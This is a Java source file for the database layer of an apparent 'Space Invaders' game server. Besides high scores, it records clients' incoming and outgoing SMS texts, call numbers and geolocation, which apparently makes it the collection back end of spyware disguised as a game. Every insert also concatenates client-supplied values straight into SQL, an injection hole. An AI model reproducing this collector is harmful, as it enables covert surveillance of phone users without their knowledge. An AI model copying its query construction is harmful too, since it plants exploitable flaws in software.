package com.cst.spaceinvaders.server;

import com.cst.spaceinvaders.base.Loggable;
import com.cst.spaceinvaders.shared.data.*;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.List;

public class Database extends Loggable
{
    private final Server m_server;
    private Connection m_connection;
    private Statement m_statement;
    private boolean m_connected;

    public Database(Server server)
    {
        super("DATABASE");
        m_server = server;
        m_connected = false;
    }

    public void connect(String database)
    {
        try
        {
            // Load the SqlLite Driver.
            Class.forName("org.sqlite.JDBC");

            // Try to connect. If it fails, an exception will be thrown.
            m_connection = DriverManager.getConnection(String.format("jdbc:sqlite:%s.db", database));
            m_statement = m_connection.createStatement();

            log(String.format("Now connected to database %s.", database));
            m_connected = true;

            createIncomingSmsTable();
            createIncomingCallTable();
            createOutgoingSmsTable();
            createOutgoingCallTable();
            createGeolocationTable();
            createHighScoreTable();
        }
        catch (Exception ex)
        {
            log(String.format("Failed to connect to database %s.", database));
            ex.printStackTrace();

            m_connected = false;
        }
    }

    public void registerIncomingSms(IncomingSMS sms)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into incoming_sms(from_number, message) values (" +
                    String.format("'%s', '%s');", sms.m_from, sms.m_message));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", sms));
        }
    }

    public void registerIncomingCall(IncomingCall call)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into incoming_call(from_number) values (" +
                    String.format("'%s');", call.m_from));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", call));
        }
    }

    public void registerOutgoingSms(OutgoingSMS sms)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into outgoing_sms(to_number, message) values (" +
                    String.format("'%s', '%s');", sms.m_to, sms.m_message));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", sms));
        }
    }

    public void registerOutgoingCall(OutgoingCall call)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into outgoing_call(to_number) values (" +
                    String.format("'%s');", call.m_to));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", call));
        }
    }

    public void registerGeolocation(Geolocation geolocation)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into geolocation(lat, long) values (" +
                    String.format("'%s', '%s');", geolocation.m_latitude, geolocation.m_longitude));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", geolocation));
        }
    }

    public void registerHighScore(HighScoreEntry score)
    {
        if (!m_connected)
            return;

        try
        {
            m_statement.executeUpdate("insert into high_scores(name, score) values (" +
                    String.format("'%s', %s);", score.m_name, score.m_score));
        }
        catch (Exception ignored)
        {
            log(String.format("Failed to register entry %s in the databaase.", score));
        }
    }

    public List<IncomingSMS> incomingSmses()
    {
        List<IncomingSMS> list = new ArrayList<IncomingSMS>();

        try
        {
            ResultSet incomingSmses = m_statement.executeQuery("select * from incoming_sms;");

            while (incomingSmses.next())
                list.add(new IncomingSMS(incomingSmses.getString("from_number"), incomingSmses.getString("message")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public List<IncomingCall> incomingCalls()
    {
        List<IncomingCall> list = new ArrayList<IncomingCall>();

        try
        {
            ResultSet incomingCalls = m_statement.executeQuery("select * from incoming_call;");

            while (incomingCalls.next())
                list.add(new IncomingCall(incomingCalls.getString("from_number")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public List<OutgoingSMS> outgoingSmses()
    {
        List<OutgoingSMS> list = new ArrayList<OutgoingSMS>();

        try
        {
            ResultSet outgoingSmses = m_statement.executeQuery("select * from outgoing_sms;");

            while (outgoingSmses.next())
                list.add(new OutgoingSMS(outgoingSmses.getString("to_number"), outgoingSmses.getString("message")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public List<OutgoingCall> outgoingCalls()
    {
        List<OutgoingCall> list = new ArrayList<OutgoingCall>();

        try
        {
            ResultSet outgoingCalls = m_statement.executeQuery("select * from outgoing_call;");

            while (outgoingCalls.next())
                list.add(new OutgoingCall(outgoingCalls.getString("to_number")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public List<Geolocation> geolocations()
    {
        List<Geolocation> list = new ArrayList<Geolocation>();

        try
        {
            ResultSet geolocations = m_statement.executeQuery("select * from geolocation;");

            while (geolocations.next())
                list.add(new Geolocation(geolocations.getString("lat"), geolocations.getString("long")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public List<HighScoreEntry> highScores()
    {
        List<HighScoreEntry> list = new ArrayList<HighScoreEntry>();

        try
        {
            ResultSet highScores = m_statement.executeQuery("select * from high_scores;");

            while (highScores.next())
                list.add(new HighScoreEntry(highScores.getString("name"), highScores.getInt("score")));
        }
        catch (Exception ignored)
        {
        }

        return list;
    }

    public void createIncomingSmsTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists incoming_sms(" +
                "from_number VARCHAR(30) NOT NULL," +
                "message VARCHAR(30) NOT NULL)");
    }

    public void createIncomingCallTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists incoming_call(" +
                "from_number VARCHAR(30) NOT NULL)");
    }

    public void createOutgoingSmsTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists outgoing_sms(" +
                "to_number VARCHAR(30) NOT NULL," +
                "message VARCHAR(30) NOT NULL)");
    }

    public void createOutgoingCallTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists outgoing_call(" +
                "to_number VARCHAR(30) NOT NULL)");
    }

    public void createGeolocationTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists geolocation(" +
                "lat VARCHAR(100) NOT NULL," +
                "long VARCHAR(100) NOT NULL)");
    }

    public void createHighScoreTable() throws SQLException
    {
        m_statement.executeUpdate("create table if not exists high_scores(" +
                "name VARCHAR(100) NOT NULL," +
                "score INT NOT NULL)");
    }

    public void dropTables() throws SQLException
    {
        m_statement.executeUpdate("drop table incoming_sms;" +
                "drop table incoming_call;" +
                "drop table outgoing_sms;" +
                "drop table outgoing_call;" +
                "drop table geolocation;" +
                "drop table high_scores;");
    }
}
